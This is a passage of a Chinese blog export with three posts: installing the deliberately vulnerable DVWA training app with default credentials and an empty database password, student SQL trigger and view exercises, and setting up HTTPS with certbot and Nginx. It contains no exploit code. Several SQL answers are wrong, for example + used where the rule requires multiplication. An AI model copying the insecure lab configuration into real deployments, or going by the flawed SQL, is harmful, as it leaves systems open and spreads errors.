[{"title":"DVWA靶场渗透（一）：环境搭建","url":"/2018/06/01/DVWA-build/","content":"\n## 一、DVWA简介\n\nDVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。\n\nDVWA共有十个模块，分别是：\n\nBrute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）XSS（Stored）（存储型跨站脚本)\n\nDVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible\n\nLow就对应很低的安全级别，几乎是不采取任何安全措施的级别。Medium对应中等，High对应安全级别，但是仍有可利用的漏洞。Impossible就是对应目前还没有漏洞利用的方式，采取这种方式当前是非常安全的。\n\n## 二、DVWA环境搭建\n\n我安装DVWA的环境是ubuntu18.04和xampp。本来是想安装在Kali Linux上，但是由于自己的电脑硬盘限制，也由于自己对ubuntu的喜爱，尤其是更新后的18.04版本的界面做的还是很漂亮的（虽然以后搞运维或者安全大部分时间可能没有图形化界面），所以就索性在vmware上安装了ubuntu。kali和ubuntu都是基于Debian的Linux发行版，其内核是一样的。折腾折腾可以把kali上集成的自己需要的安全审计软件在ubuntu上安装。也是不错的。安装系统的过程就不在这里记录了。vmware提供了傻瓜式的安装。\n\n#### 1、ubuntu安装xampp\n\n首先到官网下载Linux版的xampp。\n\n![xampp](../img/DWVA-1/xampp.jpg)\n\n下载后会有一个xampp-linux-x64-7.2.5-0-installer.run文件。可能由于一开始安装系统时磁盘分区的问题，我把放在桌面的文件运行安装时中途总会被kill掉，查询了原因是因为内存或者硬盘不够。所以我把安装系统的分配内存开到了2G（宿主主机一共4G内存），但是还是不行，会被kill掉。我给虚拟机分配的是20G的硬盘，空间应该是完全够的。所以应该是分区的问题，桌面文件夹所在的分区空间是不够的。因为在安装系统的时候是傻瓜式安装，什么都没有操作就安装好了。所以下一步就把这个安装文件移动到了/opt文件夹里，/opt文件夹存放的是用户自己安装的一些软件，所以我认为安装在这里是没有问题的。\n\n执行复制命令（一定要有root权限）：\n\n`sudo cp xampp-linux-x64-7.2.5-0-installer.run /opt`\n\n然后进行安装：\n\n`sudo ./xampp-linux-x64-7.2.5-0-installer.run`\n\n安装好了之后，会在/opt文件夹里出现一个lampp文件夹，里面有一个lampp可执行文件。进入文件夹后执行\n\n`sudo ./lampp start` 启动xampp的服务。\n\n当显示如下就说明服务启动成功了：\n\n![xamppinstallsuccess](../img/DWVA-1/xamppinstallsuccess.png)\n\n然后查看本虚拟机的ip，执行`ifconfig`：\n\n![ifconfig](../img/DWVA-1/ifconfig.png)\n\n本虚拟机的ip地址为172.16.127.129。所以我们浏览器里访问172.16.127.129：\n\n![xamppweb](../img/DWVA-1/xamppweb.png)\n\n出现这个页面就表明安装成功了，可以开始部署DVWA的环境了。\n\n#### 2、部署DVWA\n\n首先去DVWA官网下载文件：\n\n![DVWAdownload](../img/DWVA-1/DVWAdownload.png)\n\n下载好之后，进行解压，我们需要把DVWA解压后的文件夹改名成DWVA，方便在URL里访问：\n\n`cp DWVA-master DVWA`\n\n然后把文件夹复制到刚才lampp文件夹下的htdocs文件夹\n\n![htdocs](../img/DWVA-1/htdocs.png)\n\n执行`cp -r DVWA /opt/lampp/htdocs`\n\n然后我们需要修改一下`/DVWA/config`文件夹下的`config.inc.php.dist`文件：\n\n![config](../img/DWVA-1/config.png)\n\n把db_password先改成空。因为xampp中的mysql的root用户密码默认是空的。然后我们需要把`config.inc.php.dist`的文件名改成`config.inc.php`，执行命令：\n\n`cp config.inc.php.dist config.inc.php`\n\n然后启动xampp服务，进入172.16.127.129/DVWA，可以进入到DVWA的登录页面：\n\n![DVWAlogin](../img/DWVA-1/DVWAlogin.png)\n\n默认的用户名和密码是admin，password。进入后的页面如下：\n\n![DVWA](../img/DWVA-1/DVWA.png)\n\n左边就对应10个模块。\n\n至此安装搭建环境全部完成。其实还有很多方式，也可以在宿主系统上安装，但是不能用自己的公网IP，否则很容易就成了靶机，导致乱箭穿心。\n\n开始渗透之旅吧！"},{"title":"SQL练习3","url":"/2018/05/14/SQL练习3/","content":"\n# SQL实验：触发器\n\n### 一、实验目的\n\n加深和巩固对触发器概念的理解。\n\n掌握触发器的简单应用。\n\n### 二、实验内容\n\n学生数据库由三张表组成：xsqk、xskc、xscj，各个表的结构如下：\n\n##### 表1 xsqk结构\n\n| 列名     | 数据类型      | 长度 | 允许空值 | 说明       |\n| -------- | ------------- | ---- | -------- | ---------- |\n| 系别     | Char          | 10   | √        |            |\n| 班级     | Char          | 12   | √        |            |\n| 专业     | Varchar       | 30   | √        |            |\n| 学号     | Char          | 8    | ×        | 主键       |\n| 姓名     | Char          | 8    | ×        |            |\n| 性别     | Char          | 2    | √        | 默认值：男 |\n| 出生年月 | Smalldatetime | 4    | √        |            |\n| 总学分   | Tinyint       | 1    | √        |            |\n| 备注     | Text          | 16   | √        |            |\n\n##### 表2 xskc结构\n\n| 列名     | 数据类型 | 长度 | 允许空值 | 说明      |\n| -------- | -------- | ---- | -------- | --------- |\n| 课程号   | Char     | 3    | ×        | 主键      |\n| 课程名   | Char     | 16   | ×        |           |\n| 开课学期 | Tinyint  | 1    | ×        | 规则：1~8 |\n| 学时     | Tinyint  | 1    | ×        |           |\n| 学分     | Tinyint  | 1    | √        |           |\n\n##### 表3 xscj结构\n\n| 列名   | 数据类型 | 长度 | 允许空值 | 说明 |\n| ------ | -------- | ---- | -------- | ---- |\n| 学号   | Char     | 8    | ×        | 主键 |\n| 课程号 | Char     | 3    | ×        | 主键 |\n| 成绩   | Tinyint  | 1    | √        |      |\n| 学分   | Tinyint  | 1    | √        |      |\n\n##### 表4 学生情况表（xsqk）数据样本\n\n| 系别   |     班级     | 专业             |   学号   |  姓名  | 性别 |  出生年月  | 总学分 | 备注 |\n| ------ | :----------: | ---------------- | :------: | :----: | :--: | :--------: | :----: | :--: |\n| 计算机 |  计算机0203  | 计算机应用与维护 | 02020101 | 王玲玲 |  女  | 1981-8-26  |   9    |      |\n| 计算机 |  计算机0203  | 计算机应用与维护 | 02020102 | 张燕红 |  女  | 1981-10-20 |   9    |      |\n| 计算机 |  计算机0203  | 计算机应用与维护 | 02020103 |  杨勇  |  男  | 1982-3-15  |        |      |\n| 计算机 |  计算机0203  | 计算机应用与维护 | 02020104 | 王红庆 |  男  | 1983-5-17  |        |      |\n| 计算机 |  计算机0203  | 计算机应用与维护 | 02020105 |  陈园  |  女  | 1982-4-12  |        |      |\n| 计算机 | 信息管理0201 | 信息管理         | 02020201 | 黄薇娜 |  女  | 1983-8-19  |   8    |      |\n| 计算机 | 信息管理0201 | 信息管理         | 02020202 |  沈昊  |  男  | 1982-3-18  |   8    |      |\n| 计算机 | 信息管理0201 | 信息管理         | 02020203 | 傅亮达 |  男  | 1983-1-22  |        |      |\n| 计算机 | 信息管理0201 | 信息管理         | 02020204 | 任建刚 |  男  | 1981-12-21 |        |      |\n| 计算机 | 信息管理0201 | 信息管理         | 02020205 | 叶小红 |  女  | 1983-7-16  |        |      |\n\n##### 表5 学生课程表（xskc）数据样本\n\n| 课程号 | 课程名         | 开课学期 | 学时 | 学分 |\n| ------ | -------------- | -------- | ---- | ---- |\n| 101    | 计算机文化基础 | 1        | 86   | 4    |\n| 102    | Qbasic         | 1        | 68   | 4    |\n| 205    | 离散数学       | 3        | 64   | 4    |\n| 206    | VC             | 2        | 68   | 4    |\n| 208    | 数据结构       | 2        | 68   | 4    |\n| 210    | 操作系统       | 3        | 64   | 4    |\n| 212    | 计算机组成     | 4        | 86   | 5    |\n| 216    | 数据库原理     | 2        | 68   | 4    |\n| 301    | 计算机网络     | 5        | 56   | 3    |\n\n##### 表6 学生成绩表（xscj）数据样本\n\n| 学号     | 课程号 | 成绩 | 学分 |\n| -------- | ------ | ---- | ---- |\n| 02020101 | 101    | 85   | 4    |\n| 02020101 | 102    | 70   | 5    |\n| 02020102 | 101    | 90   | 4    |\n| 02020102 | 102    | 80   | 5    |\n| 02020201 | 101    | 86   | 4    |\n| 02020201 | 208    | 80   | 4    |\n| 02020202 | 208    | 50   | 4    |\n| 02020202 | 216    | 60   | 4    |\n\n#### 一、触发器：\n\n1、在学生成绩库中创建触发器trigger1，实现如下功能：当在学生成绩表（xscj）中插入一条学生选课信息后，自动实现更新该学生在学生情况表（xsqk）中的总学分信息。\n\n```sql\nCREATE TRIGGER trigger1 AFTER INSERT ON xscj\nFOR EACH ROW\nBEGIN\nUPDATE xsqk SET xsqk.`总学分` = xsqk.`总学分` + new.`学分` WHERE xsqk.`学号`=new.`学号`;\nEND\n```\n\n分析：根据题意，要求在学生成绩表中插入一条记录时，自动更新学生情况表中的相应记录信息。可以通过在学生成绩表中定义INSERT类型的触发器，触发器中语句要完成的功能是更新学生情况表中的相应学生的总学分信息。其实，只要在该生原总学分基础上加上新选课程的学分就可以了。\n\n2、创建触发器trigger2，实现当修改学生课程表（xskc）中的数据时，显示提示信息“学生课程表被修改了”。\n\n```sql\nCREATE TRIGGER trigger2 AFTER UPDATE ON xskc FOR EACH ROW\nBEGIN\nSIGNAL SQLSTATE 'TX000' SET message_text='学生课程表被修改了';\nEND;\n```\n\n3、创建触发器trigger3，实现当删除学生课程表中某门课程的记录时，对应学生成绩表中所有有关此课程的记录均删除。\n\n```sql\nCREATE TRIGGER trigger3 AFTER DELETE ON xskc\nFOR EACH ROW\nBEGIN\nDELETE FROM xscj WHERE xscj.`课程号` = old.`课程号`;\nEND\n\nor\n\nCREATE TRIGGER trigger3 AFTER DELETE ON xskc\nFOR EACH ROW\nBEGIN\nDELETE FROM xscj WHERE xscj.`课程号` = xskc.`课程号`;\nEND\n```\n\n其实我感觉这样做触发器不如直接做外键，做级联删除。\n\n4、创建触发器trigger4，实现当修改学生课程表（xskc）中的某门课的课程号时，对应学生成绩表（xscj）中的课程号也作相应修改。\n\n```sql\nCREATE TRIGGER trigger4 AFTER UPDATE ON xskc\nFOR EACH ROW\nBEGIN\nUPDATE xscj SET xscj.`课程号` = new.`课程号` where xscj.`课程号` = xskc.`课程号`;\nEND\n\nor\n\nCREATE TRIGGER trigger4 AFTER UPDATE ON xskc\nFOR EACH ROW\nBEGIN\nUPDATE xscj SET xscj.`课程号` = new.`课程号` where xscj.`课程号` = old.`课程号`;\nEND\n```\n\n这里也是添加外键做级联修改会容易理解一些，\n\n5、创建触发器trigger5，实现当向学生成绩表（xscj）中插入一条选课记录时，查看该学生的信息是否存在在学生信息表中，如果不存在，则把该学生的基本信息加入到学生信息表中。\n\n```sql\nCREATE TRIGGER trigger5 BEFORE INSERT ON xscj\nFOR EACH ROW\nBEGIN\nIF((SELECT `学号` FROM xsqk WHERE new.`学号` = xsqk.`学号`) IS NULL)\nTHEN INSERT INTO xsqk VALUES ('计算机','','',new.`学号`,'张浩森','','1981-08-26',new.`成绩`,'');\nEND IF;\nEND\n```\n\n6、在学生成绩库中创建触发器trigger6，实现如下功能：当在学生成绩表（xscj）中插入一条学生选课信息后，查看该学生的信息是否存在在学生信息表中，如果不存在，则给出“该记录不能被插入！”的错误提示，并撤销插入操作；同样，如果课程信息在课程信息表中不存在，给出“该记录不能被插入！”的错误提示，并撤销插入操作。\n\n```sql\nCREATE TRIGGER trigger6 AFTER INSERT ON xscj\nFOR EACH ROW\nBEGIN\n\tIF ((SELECT `学号` FROM xsqk WHERE new.`学号` = xsqk.`学号`) IS NULL)\n\tTHEN\n\t\tSIGNAL SQLSTATE 'TX000' SET message_text = '该记录不能被插入';\n\tELSEIF((SELECT cno FROM xskc WHERE new.`学号` = `学号`) is NULL)\n\tTHEN\n\t\tSIGNAL SQLSTATE 'TX000' SET message_text = '该记录不能被插入';\n\tEND IF;\nEND;\n```\n\n7、创建触发器trigger7，强制实现业务规则：当向学生成绩表中插入一条记录时，自动修改学生情况表中该学生的总学分，要求总学分为该学生所有已修课程的学分总和。\n\n```sql\nCREATE TRIGGER trigger7 AFTER INSERT ON xscj\nFOR EACH ROW\nBEGIN\n\tDECLARE allxf int;\n\tSELECT sum(`学分`) INTO allxf FROM xscj WHERE `学号` = new.`学号`;\n\tUPDATE xsqk SET `总学分` = allxf WHERE `学号` = new.`学号`;\nEND;\n```\n\n其实跟第一题是一样的，这里用了另一种方法实现，用DECLARE声明一个int变量，并且在INSERT后计算总学分和，再UPDATE xsqk中的数据。这样做比较好理解。\n\n8、创建触发器trigger8，要求实现：当向xscj表插入一条记录时，判断该学生的总学分，如果总学分大于等于25，则给出“该学生已修满，不需要再选修！”的提示信息；否则，自动更新该学生的总学分。\n\n```sql\nCREATE TRIGGER trigger8 BEFORE INSERT ON xscj\nFOR EACH ROW\nBEGIN\n\tDECLARE allxf int;\n\tSELECT sum(`学分`) INTO allxf FROM xscj WHERE `学号` = new.`学号`;\n\tSET allxf = allxf + new.`学分`;\n\tIF(allxf >= 25)\n\tTHEN SIGNAL SQLSTATE 'TX001' SET message_text='该学生已修满，不需要再选修!';\n\tELSE UPDATE xsqk SET `总学分` = allxf WHERE `学号` = new.`学号`;\n\tEND IF;\nEND\n```\n\n9、分别用触发器和存储过程实现对学生情况表（xsqk）和学生成绩表（xscj）的级联删除。\n\n```sql\n#触发器\nCREATE TRIGGER trigger9 AFTER DELETE ON xsqk\nFOR EACH ROW\nBEGIN\n\tDELETE FROM xscj WHERE `学号` = old.`学号`;\nEND\n```\n\n```sql\n#存储过程\nCREATE PROCEDURE proc (IN parameter CHAR(10))\nBEGIN\n\tIF(parameter IS NOT NULL)\n\tTHEN\n\t\tDELETE FROM xsqk WHERE `学号` = parameter;\n\t\tDELETE FROM xscj WHERE `学号` = parameter;\n\tEND IF;\nEND;\n```\n\n10、在数据库中用以下语句创建两张表：\n\n```sql\nCREATE TABLE `卷烟销售表`\n(\n`卷烟品牌` VARCHAR(40) PRIMARY KEY NOT NULL,\n`购货商` VARCHAR(40) NULL,\n`销售数量` INT NULL,\n`销售单价` INT NULL,\n`销售金额` INT NULL\n);\nCREATE TABLE `卷烟库存表`\n(\n`卷烟品牌` VARCHAR(40) PRIMARY KEY NOT NULL,\n`库存数量` INT NULL,\n`库存单价` INT NULL,\n`库存金额` INT NULL\n);\n```\n\n--业务规则1：销售金额 = 销售数量 * 销售单价\n\n--业务规则2：库存金额 = 库存数量 * 库存单价\n\n创建触发器[T_INSERT_卷烟库存表]，实现每当[卷烟库存表]发生 INSERT 动作，则引发该触发器。触发器功能：强制执行业务规则2，保证插入的数据中，库存金额 = 库存数量 * 库存单价。\n\n```sql\nCREATE TRIGGER trigger10 BEFORE INSERT ON `卷烟库存表`\nFOR EACH ROW\nBEGIN\n\tSET new.`库存金额` = new.`库存数量` + new.`库存单价`;\nEND\n```\n\n测试用例：针对[卷烟库存表]，插入4条测试数据。注意，第一条数据（红塔山新势力）中的数据符合业务规则，第二条数据（红塔山人为峰）中，[库存金额]空，不符合业务规则，第三条数据（云南映像）中，[库存金额]不等于[库存数量]乘以[库存单价]，不符合业务规则。第四条数据库存数量为0。请注意在插入数据后，检查[卷烟库存表]中的数据是否满足：库存金额 = 库存数量 * 库存单价。\n\n```sql\nINSERT INTO `卷烟库存表`(`卷烟品牌`,`库存数量`,`库存单价`,`库存金额`) values( '红塔山新势力',100,12,1200);\nINSERT INTO `卷烟库存表`(`卷烟品牌`,`库存数量`,`库存单价`,`库存金额`) values( '红塔山人为峰',100,22,null);\nINSERT INTO `卷烟库存表`(`卷烟品牌`,`库存数量`,`库存单价`,`库存金额`) values( '云南映像',100,60,500);\nINSERT INTO `卷烟库存表`(`卷烟品牌`,`库存数量`,`库存单价`,`库存金额`) values( '玉溪',0,30,0);\n```\n\n验证结果：\n\n![](https://ws4.sinaimg.cn/large/006tKfTcgy1frb6x44qywj30n304ojrm.jpg)\n\n11、创建触发器[T_INSERT_卷烟销售表]，实现每当卷烟销售表发生 INSERT 动作，则引发该触发器。触发器功能： 实现业务规则：如果销售的卷烟品牌不存在库存或者库存为零，则返回错误。否则，判断是否符合业务规则1，如果符合，则自动减少卷烟库存表中对应品牌卷烟的库存数量和库存金额。\n\n```sql\nCREATE TRIGGER trigger11 BEFORE INSERT ON `卷烟销售表`\nFOR EACH ROW\nBEGIN\n\tDECLARE num1 int;\n\tDECLARE num2 int;\n\tSELECT count(*) into num1 from `卷烟库存表` where `卷烟品牌` = new.`卷烟品牌`;\n\tSELECT `库存数量` - new.`销售数量` into num2 from `卷烟库存表` where `卷烟品牌` = new.`卷烟品牌`;\n\tIF(num1 = 0 || num2<=0 || (new.`销售金额` != new.`销售数量` * new.`销售单价`))\n\t\tTHEN\n\t\tSIGNAL SQLSTATE 'TX001' SET message_text='该记录不能被插入';\n\tELSE\n\t\tUPDATE `卷烟库存表` SET `库存金额` = (`库存数量` - new.`销售数量`) * `库存单价`,`库存数量` = `库存数量` - new.`销售数量` WHERE `卷烟品牌` = new.`卷烟品牌`;\n\tEND IF;\nEND;\n```"},{"title":"SQL练习2","url":"/2018/04/29/SQL练习2/","content":"\n### 一、实验目的\n\n​\t掌握复杂查询的使用方法。\n\n​\t掌握视图的创建、视图的查询以及通过视图更新（插入、修改、删除）基本表中的数据。\n\n### 二、实验任务\n\n##### 综合查询：\n\n1、求不选修C语言课程的学生学号。\n\n```sql\nselect sno from S where not exists(\n\tselect * from SC where sno = S.sno and cno = (\n\t\tselect cno from C where cname = 'C语言'));\n```\n\n2、查询平均成绩在60分以上的学生姓名。\n\n```sql\nselect sname from S x where 60 <= (\n\tselect avg(grade) from SC y where x.sno = y.sno);\n```\n\n3、求这样的学生姓名：该学生选修了全部课程并且其中一门课在90分以上。\n\n```sql\nselect sname from S where sno in (\n\tselect sno from SC group by sno having count(*) = (select count(*) from C) in(\n\t\tselect sno from SC group by sno having max(grade) > 90));\n\nselect sname from S where sno in(\n\tselect sno from SC where sno in (\n\t\tselect sno from S where not exists(\n\t\t\tselect * from C where not exists(\n\t\t\t\tselect * from SC where sno = S.sno and cno = C.cno))) group by sno having max(grade) > 90);\n```\n\n4、查询选修课程数在两门以上的学生姓名。（用连接查询和嵌套查询两种方法实现）\n\n```sql\n#嵌套查询\nselect sname from S where sno in (\n\tselect sno from SC group by sno having count(*) > 2);\n\t\n#连接查询\nselect S.sname from S inner join SC on S.sno = SC.sno group by sname having count(*) > 2;\n```\n\n5、查询所有成绩都及格的学生人数。\n\n```sql\nselect count(distinct sno) from SC where sno in(\n\tselect sno from SC group by sno having min(grade) >= 60);\n```\n\n6、查询成绩及格的学生人次。\n\n```sql\nselect count(sname) from S where sname in(select sname from S x where 60 <= (\n\tselect avg(grade) from SC y where x.sno = y.sno));\n```\n\n7、查询所有学生都没有选修的课程名称。\n\n```sql\nselect cname from C where cno not in (\n\tselect distinct cno from SC);\n```\n\n8、查询每个学生的平均成绩，并按平均成绩的降序排序。\n\n```sql\nselect sname, avg(grade) from S,SC where S.sno = SC.sno group by SC.sno order by avg(grade) DESC;\n```\n\n9、查询每个同学的最高分，要求显示学号、姓名和分数等信息。\n\n```sql\nselect S.sno, sname, max(grade) from SC,S where S.sno = SC.sno group by SC.sno;\n```\n\n10、查询选修同一门课程的学生学号。\n\n```sql\nselect distinct sno from SC,C where SC.cno = C.cno;\n```\n\n11、查询不及格学生的学号、课程名、开课学期的信息。\n\n```sql\nselect SC.sno, C.cname, SC.term from SC,C where SC.cno = C.cno and sno in (\n\tselect sno from SC group by sno having avg(grade) < 60); \n```\n\n12、按学号分组汇总总分高于100的学生记录，并按总分的降序排列。\n\n```sql\nselect S.* from S,SC where S.sno = SC.sno group by SC.sno having sum(grade) > 100 order by sum(grade) DESC;\n```\n\n13、求恰好有两门课程不及格的学生信息。\n\n```sql\nselect * from S where sno in (\n\tselect sno from sc where grade < 60 group by sno having count(cno)=2)\n```\n\n14、查询每门课程的最高分的学生记录。\n\n```sql\nselect S.*, SC.cno from S,SC,C where S.sno = SC.sno and SC.cno = C.cno and grade in (\n\tselect max(grade) from SC where SC.cno = C.cno);\n```\n\n15、查询每个学生的最低分的课程记录。\n\n```sql\nselect C.*, SC.sno from S,SC,C where S.sno = SC.sno and SC.cno = C.cno and grade in (\n\tselect min(grade) from SC where SC.sno = S.sno);\n```\n\n**视图管理：**\n\n1、为学生表创建一个视图V_XSQK，以显示学生的基本信息，如学号、姓名、性别和出生年月。\n\n```sql\ncreate view V_XSQK as select sno,sname,ssex,sbirth from S;\n```\n\n2、创建视图V_SC，要求显示学生的姓名、选修的课程名和成绩。\n\n```sql\ncreate view V_SC as select S.sname,C.cname,SC.grade from S,C,SC where S.sno=SC.sno and C.cno=SC.cno;\n```\n\n3、创建视图V_ST，显示在1981-1-1以后出生的学生信息，包括学号，姓名，性别和出生年月。\n\n```sql\ncreate view V_ST as select sno,sname,ssex,sbirth from S where sbirth>'1981-1-1';\n```\n\n4、创建视图v_HG，显示成绩合格的学生信息，包括姓名、课程名和成绩。\n\n```sql\ncreate view v_HG as select S.sname,C.cname,SC.grade from S,C,SC, where S.sno=SC.sno and C.cno=SC.cno and SC.grade>=60;\n```\n\n5、创建分组视图V_GP，要求查询每个学生的平均成绩，包括姓名，平均成绩。\n\n```sql\ncreate view v_GP as select S.sname, avg(grade) from S,SC where S.sno = SC.sno group by SC.sno;\n```\n\n6、向视图V_XSQK中插入一条记录：‘2020206’，‘李红’，‘1983-12-3’。\n\n```sql\ninsert into V_XSQK values ('2020206','李红','女','1983-12-3');\n```\n\n7、修改视图V_XSQK，将李红同学是出生年月改为1982-12-3。\n\n```sql\nupdate V_XSQK set sbirth='1982-12-3' where sno='2020206';\n```\n\n8、删除视图V_XSQK中李红同学的信息。\n\n```sql\ndelete from V_XSQK where sno='2020206';\n```\n\n9、删除视图V_XSQK。\n\n```sql\ndrop view v_XSQK;\n```\n\n10、创建视图V_PJ，查询平均成绩在60分以上的学生信息，包括姓名和平均成绩。\n\n```sql\ncreate or replace view V_PJ as select S.sname, avg(grade) from S,SC where S.sno = SC.sno group by SC.sno having avg(grade) > 60;\n```\n\n注意：用到的表结构及信息如下：\n\nS：学生基本信息表；C：课程基本信息表；SC：学生选课信息表。\n\n各表的结构以及数据如下所示：  \n\n表2.1 学生基本信息表(表名：S)\n\n| sno   | sname | ssex | sbirth    | Sdept |\n| ----- | ----- | ---- | --------- | ----- |\n| 95001 | 李勇  | 男   | 1986/1/1  | CS    |\n| 95002 | 刘晨  | 女   | 1985/2/1  | IS    |\n| 95003 | 王敏  | 女   | 1886/10/4 | MA    |\n| 95004 | 张立  | 男   | 1985/6/8  | IS    |\n\n \n\n表2.2 课程基本信息表(表名：C)\n\n| cno  | cname    | cpno | Ccredit |\n| ---- | -------- | ---- | ------- |\n| 1    | 数据库   | 2    | 4       |\n| 2    | 数学     |      | 3       |\n| 3    | 信息系统 | 1    | 4       |\n| 4    | 操作系统 | 5    | 3       |\n| 5    | 数据结构 | 6    | 3       |\n| 6    | C语言    |      | 2       |\n\n \n\n表2.3 学生选课信息表(表名：SC)\n\n| sno   | cno  | grade | term |\n| ----- | ---- | ----- | ---- |\n| 95001 | 1    | 92    | 1    |\n| 95001 | 2    | 85    | 2    |\n| 95001 | 3    | 87    | 3    |\n| 95002 | 2    | 78    | 2    |\n| 95002 | 3    | 84    | 3    |\n| 95003 | 1    | 30    | 1    |\n| 95004 | 2    | 58    | 2    |\n| 95004 | 4    | 70    | 3    |\n| 95002 | 5    | 60    | 4    |\n| 95003 | 4    | 70    | 3    |\n\n "},{"title":"网站配置HTTPS加密传输协议","url":"/2018/04/29/HTTPS配置/","content":"\n## 一、前言\n\n​\t当今时代对上网的安全性要求比以前更高，chrome和firefox也都大力支持网站使用HTTPS，苹果也从2017年开始在iOS 10系统中强制app使用HTTPS来传输数据，微信小程序也是要求必须使用HTTPS请求，由此可见HTTPS势在必行。Google浏览器也把所有没有用https协议的网站判断为危险网站。\n\n## 二、HTTPS\n\n​\t超文本传输安全协议（英语：Hypertext Transfer Protocol Secure，缩写：HTTPS，常称为HTTP over TLS，HTTP over SSL或HTTP Secure）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。这个协议由网景公司（Netscape）在1994年首次提出，随后扩展到互联网上。\n\n​\t与HTTP的URL由“http://”起始且默认使用端口80不同，HTTPS的URL由“https://”起始且默认使用端口443。HTTP是不安全的，且攻击者通过监听和中间人攻击等手段，可以获取网站帐户和敏感信息等。HTTPS被设计为可防止前述攻击，并在正确配置时被认为是安全的。\n\n​\t这学期上了计算机网络，目前正在学习传输层的相关知识，在TCP的rdt中翻来覆去的折腾。因为学习应用层的时候学习了HTTP协议，就准备给自己的网站配置一下HTTPS。\n\n​\thttp与https的几点区别：\n1、https协议需要到CA申请证书，一般是收费的。\n2、http协议运行在TCP之上，所有传输的内容都是明文，https运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。\n3、http与https是两种不同的链接方式，端口也不一样，http使用80端口，https使用443端口。\n4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。\n\n## 三、HTTPS SSL证书\n\n​\tSSL证书，用于加密HTTP协议，也就是HTTPS。淘宝、百度等网站纷纷实现全站Https加密访问，搜索引擎对于HTTPS更加友好，加上互联网上越来越多的人重视隐私安全，站长们给网站添加SSL证书似乎成为了一种趋势。\n\n​\t如果是首次考虑为网站部署HTTPS，估计在选择证书上会有些头疼，查阅一些资料后发现这里要考虑的因素确实有很多，比如是否支持多域名、泛域名、保额、证书的价格还有浏览器上的小图标样式区别等等。目前主流的SSL证书主要分为DV SSL、OV SSL、EV SSL、还有自签名证书。\n\n​\t这里要注意，自签名证书是被浏览器视作不安全的。因此不能利用软件生成自签名证书来加密HTTP。\n\n## 四、Let’s Encrypt SSL证书\n\n![](https://ws3.sinaimg.cn/large/006tKfTcgy1fqt85v8xxxj309f0290sn.jpg)\n\n​\tLet’s Encrypt是国外一个公共的免费SSL项目，由 Linux 基金会托管，它的来头不小，由Mozilla、思科、Akamai、IdenTrust和EFF等组织发起，目的就是向网站自动签发和管理免费证书，以便加速互联网由HTTP过渡到HTTPS。\n\tLet’s Encrypt安装部署简单、方便，目前也已经有现成的安装脚本，可以很快的完成证书的申请及发放。\n\t目前Let’s Encrypt免费证书的有效期只有90天，由于Let’s Encrypt的证书属于自动签发的，所以我们也可以自己写脚本来实现定期自动更新Let’s Encrypt证书，达到一劳永逸的效果。\n\n![](https://ws4.sinaimg.cn/large/006tKfTcgy1fqt87vo56aj30hk066mxn.jpg)\n\n## 五、利用Let’s Encrypt SSL实现网站HTTPS\n\n​\t利用脚本快速获取Let’s Encrypt SSL证书，官方推荐的自动化证书颁发和安装脚本是Certbot，所以这里也是采用这个脚本进行安装（执行脚本需要root权限 ）。\n\n获取脚本：\n\n```\nwget https://dl.eff.org/certbot-auto\nchmod a+x certbot-auto\nmv certbot-auto /usr/local/sbin/\n```\n\n获取证书:\n\n```\ncd /usr/local/sbin\n./certbot-auto certonly\n```\n\n后面的获取取证书过程中Let’s encrypt需要验证用户对域名的所有权，根据提示操作即可。\n\n第一步选择nginx插件，后面的按照提示走就可以了。\n\n可以进入/etc/letsencrypt/live/www.abigale.xin路径下查看生成的证书。\n\n![](https://ws2.sinaimg.cn/large/006tKfTcgy1fqt8k3dk3fj30fu05mdgs.jpg)\n\n配置网站使用HTTPS访问，在Nginx中需要同时绑定两个Server分别监听80（HTTP）及443（HTTPS）端口。\n\nNginx关键配置清单：\n\n```\nserver {\n    listen  80;\n    server_name  yourdomain.com www.yourdomain.com;\n    ##80端口接收的请求直接重定向到HTTPS端口\n    return 301 https://www.yourdomain.com$request_uri;\n    ##....\n}\nserver {\n    listen 443 default ssl;\n    ssl on;\n    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_prefer_server_ciphers on;\n    server_name  yourdomain.com www.yourdomain.com;\n    ##...\n}\n```\n\n配置完成后重载入Nginx配置即可生效，再次通过浏览器访问你的网站就可以看到绿色小锁头的图标了。\n\nLet’s Encrypt 证书的有效期为90天，建议是每60天更新证书，以免有误差影响正常服务，证书自动更新可以通过运行certbot-auto来进行。\n为所有已安装证书的域名更新，运行如下命令：\n\n```\n./certbot-auto renew\n```\n\n命令执行过程会检查证书的到期日期，如果证书还未到期会提示你的证书尚未到期，输出如下：\n\n```\nSaving debug log to /var/log/letsencrypt/letsencrypt.log\n-------------------------------------------------------------------------------\nProcessing /etc/letsencrypt/renewal/yourdomain.com.conf\n-------------------------------------------------------------------------------\nCert not yet due for renewal\nThe following certs are not due for renewal yet:\n  /etc/letsencrypt/live/yourdomain.com/fullchain.pem (skipped)\nNo renewals were attempted.\n```\n\n为确保证书永不过期，需要增加一个cron的定期执行任务，由于更新证书脚本首先会检查证书的到期日期，并且仅当证书距离少于30天时才会执行更新，因此可以安全的创建每周甚至每天运行的cron任务。\n编辑crontab来创建一个定时调度任务（需要root权限），运行：\n\n```\nsudo crontab -e\n```\n\n添下以下代码：\n\n```\n30 3 * * 1 /usr/local/sbin/certbot-auto renew >> /var/log/letsencrypt-renew.log\n40 3 * * 1 /usr/local/nginx/sbin/nginx -s reload\n```\n\n以上代码为创建两个定时调度任务，先是在每周一的上午3:30执行`certbot-auto 